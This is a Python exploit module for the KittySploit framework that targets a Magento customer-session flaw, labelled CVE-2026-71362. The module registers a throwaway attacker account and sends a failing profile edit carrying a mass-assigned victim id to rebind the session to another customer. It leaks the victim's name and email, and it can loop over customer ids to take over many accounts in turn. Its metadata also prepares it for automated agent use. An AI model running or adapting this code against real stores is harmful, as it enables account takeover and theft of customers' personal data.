#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Magento CVE-2026-71362 customer session identity switch / account takeover."""

import html
import re
import secrets
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Magento CVE-2026-71362 Customer Account Takeover",
        "description": (
            "Exploits CVE-2026-71362 (APSB26-92): a failed customer account editPost "
            "leaves attacker-controlled customer_form_data in session, and a later "
            "edit consumes mass-assigned id to rebind the session to another customer."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-71362"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-71362",
            "https://github.com/dinosn/cve-2026-71362-magento-lab",
        ],
        "tags": [
            "magento",
            "adobe-commerce",
            "account-takeover",
            "auth-bypass",
            "customer",
            "cve-2026-71362",
            "auxiliary",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "data_exfiltration"],
            "expected_requests": 10,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "exploit_paths", "risk_signals"],
            "requires": {
                "tech_hints_any": ["magento"],
                "endpoint_pattern_any": ["/customer/account/"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "account_takeover", "from_detail": "session id switch"},
                ],
                "suggested_followups": [],
            },
        },
    }

    customer_id = OptInteger(1, "Customer entity id to hijack", False)
    enumerate_to = OptInteger(
        0,
        "When >0, walk customer ids 1..N instead of a single id",
        False,
        advanced=True,
    )

    @staticmethod
    def _form_key(body: str) -> str:
        match = re.search(r'name="form_key"[^>]*value="([^"]+)"', body or "")
        return match.group(1) if match else ""

    def _register_attacker(self) -> tuple[bool, str]:
        stamp = secrets.token_hex(4)
        email = f"kitty-atk-{stamp}@example.test"
        password = f"KittyAtk#{stamp}"
        create = self.http_request(method="GET", path="/customer/account/create", allow_redirects=True)
        if not create:
            return False, email
        fk = self._form_key(create.text or "")
        if not fk:
            return False, email
        self.http_request(
            method="POST",
            path="/customer/account/createPost",
            data={
                "form_key": fk,
                "firstname": "Mallory",
                "lastname": "Attacker",
                "email": email,
                "password": password,
                "password_confirmation": password,
            },
            allow_redirects=True,
        )
        return True, email

    def _identity(self) -> str:
        response = self.http_request(
            method="GET",
            path="/customer/section/load",
            params={"sections": "customer", "force_new_section_timestamp": str(time.time())},
            headers={"X-Requested-With": "XMLHttpRequest"},
            allow_redirects=False,
        )
        if not response:
            return ""
        try:
            return str((response.json().get("customer") or {}).get("firstname") or "")
        except Exception:
            return ""

    def _leak_profile(self) -> dict:
        response = self.http_request(method="GET", path="/customer/account/edit", allow_redirects=True)
        body = response.text or "" if response else ""

        def field(name: str) -> str:
            match = re.search(rf'id="{name}"[^>]*value="([^"]*)"', body)
            return html.unescape(match.group(1)) if match else ""

        return {
            "firstname": field("firstname"),
            "lastname": field("lastname"),
            "email": field("email"),
        }

    def _switch_to(self, email: str, victim_id: int) -> bool:
        edit = self.http_request(method="GET", path="/customer/account/edit", allow_redirects=True)
        if not edit:
            return False
        fk = self._form_key(edit.text or "")
        if not fk:
            return False
        baseline = self._identity()
        self.http_request(
            method="POST",
            path="/customer/account/editPost",
            data={
                "form_key": fk,
                "id": str(victim_id),
                "change_email": "1",
                "current_password": "wrong-password-forces-exception",
                "email": email,
                "firstname": "Mallory",
                "lastname": "Attacker",
            },
            allow_redirects=False,
        )
        self.http_request(method="GET", path="/customer/account/edit", allow_redirects=False)
        profile = self._leak_profile()
        current = self._identity() or profile.get("firstname") or ""
        if current and current != baseline and current != "Mallory":
            print_success(f"Session switched to customer_id={victim_id}")
            print_info(f"Leaked profile: {profile}")
            return True
        if profile.get("email") and profile.get("email") != email:
            print_success(f"Session switched to customer_id={victim_id}")
            print_info(f"Leaked profile: {profile}")
            return True
        return False

    def run(self):
        print_status("CVE-2026-71362 — Magento customer session identity switch")
        ok, email = self._register_attacker()
        if not ok:
            print_error("Could not register throwaway attacker account")
            return False
        baseline = self._identity()
        print_info(f"Attacker baseline identity: {baseline or 'unknown'}")
        limit = int(self.enumerate_to or 0)
        if limit > 0:
            hit = False
            for victim_id in range(1, limit + 1):
                if self._switch_to(email, victim_id):
                    hit = True
            return hit
        victim_id = int(self.customer_id or 1)
        if self._switch_to(email, victim_id):
            return True
        print_error("Identity switch failed — target patched or registration disabled")
        return False
